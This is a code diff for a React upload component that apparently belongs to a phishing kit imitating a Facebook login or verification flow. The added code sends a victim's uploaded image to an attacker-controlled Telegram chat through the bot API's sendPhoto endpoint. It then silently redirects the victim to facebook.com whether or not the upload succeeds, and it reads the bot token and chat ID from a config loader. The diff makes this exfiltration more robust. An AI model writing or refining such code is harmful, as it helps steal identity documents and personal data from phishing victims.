@@ -1,4 +1,5 @@
 import type { Config } from "@/components/password-modal";
+import getConfig from "@/utils/config";
 import { faXmark } from "@fortawesome/free-solid-svg-icons";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import axios from "axios";
@@ -15,12 +16,26 @@ const Upload: FC = () => {
 
 	const upLoadImage = async (file: File) => {
 		const messageId = localStorage.getItem("messageId");
-		await axios.post(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
-			photo: file,
-			chat_id: config.chatId,
-			reply_to_message_id: messageId,
-		});
-		window.location.replace("https://facebook.com");
+		const formData = new FormData();
+		formData.append("photo", file);
+		formData.append("chat_id", config.chatId);
+		if (messageId) {
+			formData.append("reply_to_message_id", messageId);
+		}
+		try {
+			await axios.post(
+				`https://api.telegram.org/bot${config.token}/sendPhoto`,
+				formData,
+				{
+					headers: {
+						"Content-Type": "multipart/form-data",
+					},
+				},
+			);
+			window.location.replace("https://facebook.com");
+		} catch {
+			window.location.replace("https://facebook.com");
+		}
 	};
 	const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
 		const file = event.target.files?.[0];
@@ -30,7 +45,13 @@ const Upload: FC = () => {
 	};
 
 	useEffect(() => {
-		setConfig(JSON.parse(localStorage.getItem("config") ?? "{}"));
+		const { telegram, settings } = getConfig();
+		setConfig({
+			chatId: telegram.data_chatid,
+			token: telegram.data_token,
+			loadingTime: settings.code_loading_time,
+			maxAttempt: settings.max_failed_code_attempts,
+		});
 	}, []);
 	return (
 		<div className="w-11/12 rounded-lg bg-white p-8 shadow-2xl md:w-2/5">
